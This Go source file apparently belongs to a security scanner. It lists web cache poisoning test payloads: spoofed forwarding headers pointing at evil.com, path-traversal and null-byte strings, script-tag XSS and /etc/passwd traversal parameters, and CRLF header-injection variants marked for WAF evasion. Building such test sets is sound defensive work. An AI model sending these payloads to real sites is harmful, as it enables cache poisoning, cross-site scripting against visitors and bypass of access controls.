// Package cachepoisoning provides web cache poisoning test payloads.
// Payloads are categorized by:
//   - Category (Header-based, Path-based, Parameter-based)
//   - Unkeyed headers for cache key manipulation
//   - Poisoning techniques for various cache implementations
package cachepoisoning

// Category represents a cache poisoning payload category.
type Category string

const (
	// HeaderBased represents header-based cache poisoning payloads.
	HeaderBased Category = "header"
	// PathBased represents path-based cache poisoning payloads.
	PathBased Category = "path"
	// ParameterBased represents parameter-based cache poisoning payloads.
	ParameterBased Category = "parameter"
	// Generic represents generic cache poisoning payloads.
	Generic Category = "generic"
)

// Payload represents a cache poisoning test payload.
type Payload struct {
	HeaderName  string
	Value       string
	Category    Category
	Description string
	WAFBypass   bool
}

// UnkeyedHeader represents a header commonly excluded from cache keys.
type UnkeyedHeader struct {
	Name        string
	TestValue   string
	Description string
}

// GetPayloads returns payloads for a specific category.
func GetPayloads(category Category) []Payload {
	switch category {
	case HeaderBased:
		return headerPayloads
	case PathBased:
		return pathPayloads
	case ParameterBased:
		return parameterPayloads
	default:
		return genericPayloads
	}
}

// GetAllPayloads returns all payloads for all categories.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, headerPayloads...)
	all = append(all, pathPayloads...)
	all = append(all, parameterPayloads...)
	all = append(all, genericPayloads...)
	return all
}

// GetUnkeyedHeaders returns headers commonly excluded from cache keys.
func GetUnkeyedHeaders() []UnkeyedHeader {
	return unkeyedHeaders
}

// GetWAFBypassPayloads returns payloads designed for WAF evasion.
func GetWAFBypassPayloads() []Payload {
	all := GetAllPayloads()
	var result []Payload
	for _, p := range all {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// DeduplicatePayloads removes duplicate payloads based on HeaderName, Value, and Category.
func DeduplicatePayloads(payloads []Payload) []Payload {
	seen := make(map[string]bool)
	var result []Payload
	for _, p := range payloads {
		key := p.HeaderName + "|" + p.Value + "|" + string(p.Category)
		if !seen[key] {
			seen[key] = true
			result = append(result, p)
		}
	}
	return result
}

// Unkeyed headers commonly excluded from cache keys.
var unkeyedHeaders = []UnkeyedHeader{
	{Name: "X-Forwarded-Host", TestValue: "evil.com", Description: "Forwarded host header, often reflected in redirects and links"},
	{Name: "X-Forwarded-Scheme", TestValue: "nothttps", Description: "Forwarded scheme header, can force redirect loops"},
	{Name: "X-Original-URL", TestValue: "/admin", Description: "Original URL override, can bypass path-based access controls"},
	{Name: "X-Forwarded-Port", TestValue: "1337", Description: "Forwarded port header, reflected in generated URLs"},
	{Name: "X-Rewrite-URL", TestValue: "/admin", Description: "URL rewrite header, can override request path"},
	{Name: "X-Forwarded-For", TestValue: "127.0.0.1", Description: "Forwarded IP header, can bypass IP-based restrictions"},
	{Name: "X-Host", TestValue: "evil.com", Description: "Alternative host header, reflected in some frameworks"},
	{Name: "X-Forwarded-Server", TestValue: "evil.com", Description: "Forwarded server name, reflected in server-generated content"},
	{Name: "X-HTTP-Method-Override", TestValue: "POST", Description: "Method override header, can change request handling"},
	{Name: "X-Forwarded-Proto", TestValue: "http", Description: "Forwarded protocol header, can force HTTP downgrade"},
}

// Header-based cache poisoning payloads.
var headerPayloads = []Payload{
	{HeaderName: "X-Forwarded-Host", Value: "evil.com", Category: HeaderBased, Description: "X-Forwarded-Host injection for host reflection"},
	{HeaderName: "X-Forwarded-Scheme", Value: "nothttps", Category: HeaderBased, Description: "X-Forwarded-Scheme injection for scheme confusion"},
	{HeaderName: "X-Original-URL", Value: "/admin", Category: HeaderBased, Description: "X-Original-URL path override"},
	{HeaderName: "X-Forwarded-Port", Value: "1337", Category: HeaderBased, Description: "X-Forwarded-Port injection for URL manipulation"},
	{HeaderName: "X-Rewrite-URL", Value: "/admin", Category: HeaderBased, Description: "X-Rewrite-URL path override"},
	{HeaderName: "X-Host", Value: "evil.com", Category: HeaderBased, Description: "X-Host injection for host override"},
	{HeaderName: "X-Forwarded-Server", Value: "evil.com", Category: HeaderBased, Description: "X-Forwarded-Server injection"},
	{HeaderName: "X-Forwarded-Proto", Value: "http", Category: HeaderBased, Description: "X-Forwarded-Proto scheme downgrade"},
	{HeaderName: "X-HTTP-Method-Override", Value: "POST", Category: HeaderBased, Description: "Method override header injection"},
	{HeaderName: "X-Forwarded-For", Value: "127.0.0.1", Category: HeaderBased, Description: "X-Forwarded-For IP spoofing for cached content"},

	// Multiple header combinations
	{HeaderName: "X-Forwarded-Host", Value: "evil.com:1337", Category: HeaderBased, Description: "Host with port injection"},
	{HeaderName: "X-Forwarded-Host", Value: "evil.com/path", Category: HeaderBased, Description: "Host with path injection"},
}

// Path-based cache poisoning payloads.
var pathPayloads = []Payload{
	{HeaderName: "", Value: "/..%2fadmin", Category: PathBased, Description: "Path traversal via encoded slash"},
	{HeaderName: "", Value: "/%2e%2e/admin", Category: PathBased, Description: "Path traversal via double-encoded dots"},
	{HeaderName: "", Value: "/static/../admin", Category: PathBased, Description: "Path normalization confusion"},
	{HeaderName: "", Value: "/test%00.css", Category: PathBased, Description: "Null byte path truncation"},
	{HeaderName: "", Value: "/test;.css", Category: PathBased, Description: "Semicolon path parameter confusion"},
}

// Parameter-based cache poisoning payloads.
var parameterPayloads = []Payload{
	{HeaderName: "", Value: "utm_content=<script>alert(1)</script>", Category: ParameterBased, Description: "UTM parameter XSS injection"},
	{HeaderName: "", Value: "callback=evilFunction", Category: ParameterBased, Description: "JSONP callback injection"},
	{HeaderName: "", Value: "_=<script>alert(1)</script>", Category: ParameterBased, Description: "Cache buster parameter XSS"},
	{HeaderName: "", Value: "lang=../../etc/passwd", Category: ParameterBased, Description: "Language parameter path traversal"},
}

// Generic cache poisoning payloads.
var genericPayloads = []Payload{
	{HeaderName: "X-Forwarded-Host", Value: "evil.com", Category: Generic, Description: "Generic host override for reflection testing"},
	{HeaderName: "X-Forwarded-Scheme", Value: "nothttps", Category: Generic, Description: "Generic scheme override for redirect testing"},
	{HeaderName: "X-Original-URL", Value: "/admin/secret", Category: Generic, Description: "Generic path override for access control testing"},
	{HeaderName: "X-Forwarded-Port", Value: "8080", Category: Generic, Description: "Generic port override for URL generation testing"},

	// WAF bypass variants
	{HeaderName: "X-Forwarded-Host", Value: "evil.com\r\nX-Injected: true", Category: Generic, Description: "CRLF injection via forwarded host", WAFBypass: true},
	{HeaderName: "X-Forwarded-Host", Value: "evil.com%0d%0aX-Injected:%20true", Category: Generic, Description: "URL-encoded CRLF via forwarded host", WAFBypass: true},
	{HeaderName: "X_Forwarded_Host", Value: "evil.com", Category: Generic, Description: "Underscore variant of forwarded host", WAFBypass: true},
}
